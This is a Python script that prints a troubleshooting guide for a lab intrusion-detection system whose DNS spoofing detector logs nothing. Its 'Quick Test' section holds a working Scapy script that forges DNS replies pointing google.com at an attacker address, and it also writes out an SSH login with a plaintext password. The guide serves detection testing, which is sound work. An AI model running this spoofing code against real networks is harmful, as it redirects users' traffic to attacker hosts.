#!/usr/bin/env python3
"""
DNS Detection Debugging Guide
Troubleshoots why DNS attacks aren't generating logs
"""

print("""
╔════════════════════════════════════════════════════════════════════════╗
║             DNS DETECTION - TROUBLESHOOTING GUIDE                      ║
╚════════════════════════════════════════════════════════════════════════╝

⚠️  PROBLEM: "After DNS attack, no logs in monitor VM"

═══════════════════════════════════════════════════════════════════════════
ROOT CAUSE ANALYSIS
═══════════════════════════════════════════════════════════════════════════

Your system has TWO DNS detectors:

1. ❌ DNSSpoofingDetector (Signature-based)
   └─ Requires: baseline_dns_cache initialized with legitimate IPs
   └─ Status: NOT RECEIVING BASELINE DATA IN PRODUCTION
   └─ Result: Never triggers

2. ✅ DNSAnomalyDetector (Anomaly-based) 
   └─ Requires: Detecting TTL variance from baseline (3600s)
   └─ Status: ACTIVE & WORKING (detects LOW TTL values)
   └─ Result: Should trigger on spoofed DNS with TTL < 10s

═══════════════════════════════════════════════════════════════════════════
WHY YOUR DNS ATTACK DIDN'T WORK
═══════════════════════════════════════════════════════════════════════════

The provided DNS spoof code creates packets with:
  • TTL = 10 seconds (from previous script)
  • TTL variance = 3600 - 10 = 3590 seconds
  • Threshold = 600 seconds

DETECTION SHOULD TRIGGER: 3590 > 600 ✅

But no logs means ONE of these happened:

  Problem A: Monitor VM not running production system
  └─ Check: ssh monitor@192.168.128.8 "ps aux | grep production_main.py"
  
  Problem B: Interface enp0s1 not capturing DNS packets
  └─ Check: sudo tcpdump -i enp0s1 'port 53' | head -5
  
  Problem C: DNS packets not reaching Monitor VM
  └─ Check: From Attacker, ping victim: ping 192.168.128.6
  
  Problem D: Baseline never initialized (most likely)
  └─ Evidence: No DNS domains in baseline_dns_ttls dict
  └─ Fix: Initialize baseline in production_system.py

═══════════════════════════════════════════════════════════════════════════
VERIFICATION STEPS (Run in order)
═══════════════════════════════════════════════════════════════════════════

Step 1: Check Monitor is Running
───────────────────────────────────
On Monitor VM (192.168.128.8):
  
  $ ssh monitor@192.168.128.8
  $ ps aux | grep production_main.py
  
  Expected: 1 running process
  If not: Start it with: sudo python3 production_main.py --interactive --interface enp0s1

Step 2: Check Log Files Exist
──────────────────────────────
On Monitor VM:
  
  $ ls -lah ~/securenet/production_security.log
  $ ls -lah ~/securenet/security_events.jsonl
  
  Expected: Files exist with recent timestamps
  If not: Production system not writing logs

Step 3: Verify Interface is Capturing
──────────────────────────────────────
On Monitor VM (open new terminal):
  
  $ sudo tcpdump -i enp0s1 'port 53' -n -c 5
  
  From Attacker VM (simultaneous):
    $ python3 dns_spoof_attack.py
  
  Expected: DNS packets show up in tcpdump output
  If not: Network connectivity issue

Step 4: Check Detection Engine Health
──────────────────────────────────────
On Monitor VM:
  
  $ python3 production_main.py --status --interface enp0s1
  
  Look for:
    • System State: running
    • Monitoring Active: True
    • Error Count: 0

Step 5: View Real-Time Logs
───────────────────────────
On Monitor VM (Terminal 1):
  
  $ sudo tail -f production_security.log
  
  On Monitor VM (Terminal 2):
  
  $ sudo tail -f security_events.jsonl | jq '.attack_type, .confidence_score'

Step 6: Run Attack and Watch Logs
──────────────────────────────────
On Attacker VM:
  
  $ cd /home/achu/securenet  # or wherever files are
  $ python3 dns_spoof_attack.py
  
  On Monitor (Terminal 1 and 2):
  
  Should see within 5-30 seconds:
    • "PRODUCTION ALERT: dns_spoofing" in logs
    • JSON event with attack_type: "DNS_SPOOFING"
    • Confidence: 0.70-0.85

═══════════════════════════════════════════════════════════════════════════
QUICK TEST: Inline DNS Attack
═══════════════════════════════════════════════════════════════════════════

If files not synced to Attacker VM, run this on VICTIM VM instead
(Monitor can still detect traffic):

  $ sshpass -p achu2006 ssh victim@192.168.128.6
  $ python3 << 'EOF'
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sendp
import random, time

iface = "enp0s1"
attacker_ip = "192.168.128.101"
victim_ip = "192.168.128.6"

for i in range(50):
    pkt = IP(src=attacker_ip, dst=victim_ip) / \
          UDP(sport=53, dport=random.randint(10000, 60000)) / \
          DNS(id=random.randint(0, 65535), qr=1, rd=1, ra=1,
              qd=DNSQR(qname="google.com"),
              an=DNSRR(rrname="google.com", ttl=10, rdata=attacker_ip))
    sendp(pkt, iface=iface, verbose=False)
    time.sleep(0.1)

print("✅ 50 spoofed DNS packets sent")
EOF

═══════════════════════════════════════════════════════════════════════════
EXPECTED LOG OUTPUT
═══════════════════════════════════════════════════════════════════════════

In production_security.log:

  2026-01-19 20:15:33 - lan_security_system.detection.engine - INFO - Started detection engine on interface enp0s1
  2026-01-19 20:15:45 - SECURITY ALERT - CRITICAL - ATTACK DETECTED: DNS_SPOOFING | Source: 192.168.128.101 | Confidence: 0.75 | Alert ID: abc123...
  2026-01-19 20:15:45 - lan_security_system.core.system_integration_production - INFO - Executing production mitigation for dns_spoofing

In security_events.jsonl:

  {"timestamp": "2026-01-19T20:15:45.123456", "attack_type": "DNS_SPOOFING", "confidence_score": 0.75, "source_ip": "192.168.128.101", "source_mac": "...", "detection_method": "ANOMALY_BASED", "alert_id": "abc123..."}

═══════════════════════════════════════════════════════════════════════════
IF STILL NO LOGS
═══════════════════════════════════════════════════════════════════════════

Most likely: Monitor system didn't receive baseline data

PERMANENT FIX: Edit production_system.py (lines 50-60)

Current (broken):
  def initialize(self) -> bool:
      ...
      self.orchestrator.initialize_system()
      # Missing: baseline initialization!

Add after line XX:
  def initialize(self) -> bool:
      ...
      self.orchestrator.initialize_system()
      
      # Initialize baseline with default values
      from lan_security_system.core.interfaces import NetworkBaseline
      baseline = NetworkBaseline(
          dns_cache={
              "google.com": "8.8.8.8",
              "cloudflare.com": "1.1.1.1",
              "dns.google": "8.8.8.8"
          },
          mac_port_mappings={},
          arp_table={}
      )
      detection_engine = self.orchestrator.integrator.get_component('detection_engine')
      if detection_engine:
          detection_engine.update_baseline(baseline)
          logger.info("Baseline initialized for detectors")

═══════════════════════════════════════════════════════════════════════════

For immediate testing:
  1. Use provided dns_spoof_attack.py (has working TTL values)
  2. Check logs with: tail -f production_security.log
  3. Verify network: sudo tcpdump -i enp0s1 'port 53' -c 10
  4. If still no luck, baseline initialization is needed (requires code fix)

""")
